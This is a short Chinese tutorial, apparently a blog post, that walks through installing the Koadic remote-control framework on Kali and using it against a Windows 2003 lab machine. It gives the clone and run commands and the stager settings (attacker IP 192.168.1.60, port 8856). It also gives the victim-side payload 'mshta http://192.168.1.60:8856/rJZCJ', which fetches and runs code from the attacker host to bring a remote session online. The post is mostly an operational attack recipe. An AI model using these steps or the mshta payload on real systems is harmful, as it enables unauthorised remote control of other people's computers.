       kali下  koadic致使远控上线

  

项目地址：https://github.com/zerosum0x0/koadic

  

攻击机：kali  ip：192.168.1.60

  

被攻击机：2003 ip：192.168.89

  

GitHub 下载命：     git clone https://github.com/zerosum0x0/koadic

  

![](../Images/d7c06ffd092a27d49bac23566e070a6c.png)

  

![](../Images/2ece0da8c36f2c8c79c4448e58c1b838.png)

  

该工具需要下载插件

  

下载requirements.txt内所有包

  

![](../Images/8bb3b6f953f13feb4173995aa10e18a5.png)

  

在该目录 运行   ./koadic     使用此工具

  

进入use stager/js/disk

  

Info 查看配置文件

  

![](../Images/838d418378efc865ce0db9a4259791fb.png)

  

设置IP和端口

  

![](../Images/faf1d6c11e9534f320876f37f37abf9f.png)

  

设置上线IP为：192.168.1.60

  

设置上线端口为：8856

  

输入 run   进行攻击

  

![](../Images/7fd0252ad676e6a47db96de1b992d276.png)

  

在此  我们有两种方法  

 

第一种：直接执行\[>\]后面语句

  

第二种：生成bat文件 将\[>\]后面语句粘贴到bat文件

  

mshta http://192.168.1.60:8856/rJZCJ

  

![](../Images/81b907de60ec3b9c06892b494cb7cd2e.png)

  

执行完以后可以看到kali已经上线了
